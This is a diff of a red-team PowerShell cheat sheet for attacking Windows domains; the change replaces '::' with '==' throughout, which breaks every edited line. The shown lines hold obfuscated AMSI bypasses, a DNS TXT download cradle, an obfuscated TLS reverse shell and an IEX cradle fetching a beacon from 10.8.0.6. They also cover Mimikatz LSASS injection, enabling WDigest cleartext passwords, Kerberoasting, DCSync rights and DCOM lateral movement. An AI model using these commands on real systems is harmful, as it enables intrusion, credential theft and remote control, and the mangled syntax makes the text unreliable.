@@ -21,10 +21,10 @@
 	[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
 	```
 	```Powershell
-	[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
+	[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]==Unicode.GetString([Convert]==FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]==Unicode.GetString([Convert]==FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
 	```
 	```Powershell 
-	[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
+	[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]==toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]==toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
 	```
 
 - Search for filenames
@@ -38,7 +38,7 @@ $cthulhu = New-Object System.Net.Sockets.TCPClient('10.10.14.30',8443);$tntcl = 
 - DNS cradle
 ```PowerShell
 $m= (-Join (Resolve-DnsName -Type txt pwn.domain.com).Strings);
-IEX (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m))))
+IEX (([System.Text.Encoding]==UTF8.GetString([System.Convert]==FromBase64String($m))))
 ```
 
 - Base64 the above:
@@ -49,7 +49,7 @@ IEX (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(
 
 - Obfuscated reverse shell - Must use with Socat encrypted shell listed in "Web Resources" section
 ```PowerShell
-$gnlSlSXDZ = & ([string]::join('', ( ($(0+0-0-0-0-78+78+78),$(101+101+0-0-0-0-0+0-101),($(119)),$(0+0-0-0-0+45),$($(79)),$(((98))),($(106)),$(101+101+0-0-0-0-0+0-101),$(99+99+0-99),$($(116))) |ForEach-Object{$_<##>}|%{ ( [char][int] $_<#ZdQB8miMexFGoshJ4qKRp1#>)})) |ForEach-Object{<##>$($_)}| % {<#HWEG3yFVCbNOvfYute5#>$_<#o#>}) ([string]::join('', ( ($(83+83+0+0+0-0-83),$(((121))),((115)),$($(116)),$(101+101+0-0-0-0-0+0-101),(($(109))),(46),$(0+0-0-0-0-78+78+78),$(101+101+0-0-0-0-0+0-101),$($(116)),(46),$(83+83+0+0+0-0-83),$(0+0+0+0+111),$(99+99+0-99),(107),$(101+101+0-0-0-0-0+0-101),$($(116)),((115)),(46),(84),($(67)),$(80),($(67)),$(0-0+0-108+108+108),$(0+105),$(101+101+0-0-0-0-0+0-101),(110),$($(116))) |ForEach-Object{$($_)<##>}|%{ ( [char][int] <##>$($_)<##>)})) |ForEach-Object{<#FLut3kIYDMAyO9a2hEH0zQJ4w#>$_<#WI8r#>}| % {<#OjUEN8nkxf#>$($_)})("J5q0aMgvL.xAeq3T8MEcL6sRaXUrOZ.SHUZv12CgW0es7xPkJmtFo.CbYjgiDaIe7GWdPs".replace('CbYjgiDaIe7GWdPs',DDDDDDDD).replace('SHUZv12CgW0es7xPkJmtFo',CCCCCCCC).replace('J5q0aMgvL',AAAAAAAA).replace('xAeq3T8MEcL6sRaXUrOZ',BBBBBBBB),$(EEEEEEEE));$fU4QP = $gnlSlSXDZ.GetStream();$h1okj42 = New-Object System.Net.Security.SslStream($fU4QP,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$h1okj42.AuthenticateAsClient('FFFFFFFF', $null, "Tls12", $false);$nf1083fj = new-object System.IO.StreamWriter($h1okj42);$nf1083fj.Write('PS ' + (pwd).Path + '> ');$nf1083fj.flush();[byte[]]$h8r109 = 0..65535|%{0};while(($nf839nf = $h1okj42.Read($h8r109, 0, $h8r109.Length)) -ne 0){$nr81of = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($h8r109,0, $nf839nf);$ngrog49 = (iex $nr81of | Out-String ) 2>&1;$nir1048 = $ngrog49 + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($nir1048);$h1okj42.Write($sendbyte,0,$sendbyte.Length);$h1okj42.Flush()};
+$gnlSlSXDZ = & ([string]==join('', ( ($(0+0-0-0-0-78+78+78),$(101+101+0-0-0-0-0+0-101),($(119)),$(0+0-0-0-0+45),$($(79)),$(((98))),($(106)),$(101+101+0-0-0-0-0+0-101),$(99+99+0-99),$($(116))) |ForEach-Object{$_<##>}|%{ ( [char][int] $_<#ZdQB8miMexFGoshJ4qKRp1#>)})) |ForEach-Object{<##>$($_)}| % {<#HWEG3yFVCbNOvfYute5#>$_<#o#>}) ([string]==join('', ( ($(83+83+0+0+0-0-83),$(((121))),((115)),$($(116)),$(101+101+0-0-0-0-0+0-101),(($(109))),(46),$(0+0-0-0-0-78+78+78),$(101+101+0-0-0-0-0+0-101),$($(116)),(46),$(83+83+0+0+0-0-83),$(0+0+0+0+111),$(99+99+0-99),(107),$(101+101+0-0-0-0-0+0-101),$($(116)),((115)),(46),(84),($(67)),$(80),($(67)),$(0-0+0-108+108+108),$(0+105),$(101+101+0-0-0-0-0+0-101),(110),$($(116))) |ForEach-Object{$($_)<##>}|%{ ( [char][int] <##>$($_)<##>)})) |ForEach-Object{<#FLut3kIYDMAyO9a2hEH0zQJ4w#>$_<#WI8r#>}| % {<#OjUEN8nkxf#>$($_)})("J5q0aMgvL.xAeq3T8MEcL6sRaXUrOZ.SHUZv12CgW0es7xPkJmtFo.CbYjgiDaIe7GWdPs".replace('CbYjgiDaIe7GWdPs',DDDDDDDD).replace('SHUZv12CgW0es7xPkJmtFo',CCCCCCCC).replace('J5q0aMgvL',AAAAAAAA).replace('xAeq3T8MEcL6sRaXUrOZ',BBBBBBBB),$(EEEEEEEE));$fU4QP = $gnlSlSXDZ.GetStream();$h1okj42 = New-Object System.Net.Security.SslStream($fU4QP,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$h1okj42.AuthenticateAsClient('FFFFFFFF', $null, "Tls12", $false);$nf1083fj = new-object System.IO.StreamWriter($h1okj42);$nf1083fj.Write('PS ' + (pwd).Path + '> ');$nf1083fj.flush();[byte[]]$h8r109 = 0..65535|%{0};while(($nf839nf = $h1okj42.Read($h8r109, 0, $h8r109.Length)) -ne 0){$nr81of = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($h8r109,0, $nf839nf);$ngrog49 = (iex $nr81of | Out-String ) 2>&1;$nir1048 = $ngrog49 + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($nir1048);$h1okj42.Write($sendbyte,0,$sendbyte.Length);$h1okj42.Flush()};
 	```
 		 - AAAAAAAA == 1st octet of LHOST
 		 - BBBBBBBB == 2nd octet of LHOST
@@ -81,7 +81,7 @@ Enter-PSSession -Session $session
 	- `Add-DomainObjectAcl -Rights DCSync`
 - Convert command to encoded string:
 	- `$str = "IEX ((new-object net.webclient).downloadstring('http://10.8.0.6:80/http-beacon'))"`
-	- `[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))`
+	- `[System.Convert]==ToBase64String([System.Text.Encoding]==Unicode.GetBytes($str))`
 - Encode a payload:
 ```PowerShell
 if ($args.count -ne 1) { Write-Host "Too many args" }
@@ -89,7 +89,7 @@ else {
 "String to encode: " + $Args[0]
 "Encoded: "
 $str = $Args[0]
-$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+$encoded = [System.Convert]==ToBase64String([System.Text.Encoding]==Unicode.GetBytes($str))
 write-host $encoded
 }
 ```
@@ -136,7 +136,7 @@ write-host $encoded
 - LOL Kerberoast
 	- Single SPN: `Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"`
 - Mimikatz in memory w/ LSASS Injection
-	- `Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /inject"' -Computer dc03.prod.local`
+	- `Invoke-Mimikatz -Command '"privilege==debug" "LSADump==LSA /inject"' -Computer dc03.prod.local`
 - Turn on WDigest to force storing of cleartext passwords in LSASS
 	- `Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name "UseLogonCredential" -Value '1'`
 - Copy proxy settings from valid user for SYSTEM download cradle
@@ -157,9 +157,9 @@ write-host $encoded
 
 - Lateral Movement
 	- DCOM
-		- `$([activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","acmedc.acme.int"))).Navigate("c:\windows\system32\calc.exe")`
-		- `$([activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","acmedc.acme.int"))).Navigate2("c:\windows\system32\calc.exe")`
-		- `$a=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','127.0.0.1'));$a.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c echo Cthulhu fhtagn! > C:\hi.txt','7')`
+		- `$([activator]==CreateInstance([type]==GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","acmedc.acme.int"))).Navigate("c:\windows\system32\calc.exe")`
+		- `$([activator]==CreateInstance([type]==GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","acmedc.acme.int"))).Navigate2("c:\windows\system32\calc.exe")`
+		- `$a=[System.Activator]==CreateInstance([type]==GetTypeFromProgID('MMC20.Application.1','127.0.0.1'));$a.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c echo Cthulhu fhtagn! > C:\hi.txt','7')`
 
 - Enable RestrictedAdmin
 	- `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0`
